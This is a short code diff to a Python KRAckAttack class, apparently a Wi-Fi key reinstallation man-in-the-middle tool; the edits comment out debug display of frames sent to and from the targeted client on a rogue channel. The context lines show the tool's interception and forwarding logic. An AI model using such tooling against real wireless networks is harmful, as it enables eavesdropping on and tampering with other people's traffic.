@@ -739,7 +739,7 @@ class KRAckAttack():
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
 				self.last_rogue_beacon = time.time()
 			# Display all frames sent to the targeted client
-			if self.clientmac is not None and p.addr1 == self.clientmac:
+			# if self.clientmac is not None and p.addr1 == self.clientmac:
 				# print_rx(INFO, "Rogue channel", p) -- debug
 			# And display all frames sent to a MitM'ed client
 			# elif p.addr1 in self.clients:
@@ -762,7 +762,7 @@ class KRAckAttack():
 				will_forward = client.should_forward(p)
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
 			# Always display all frames sent by the targeted client
-			elif p.addr2 == self.clientmac:
+			# elif p.addr2 == self.clientmac:
 				# print_rx(INFO, "Rogue channel", p) -- debug
 
 			# If this now belongs to a client we want to track, process the packet further
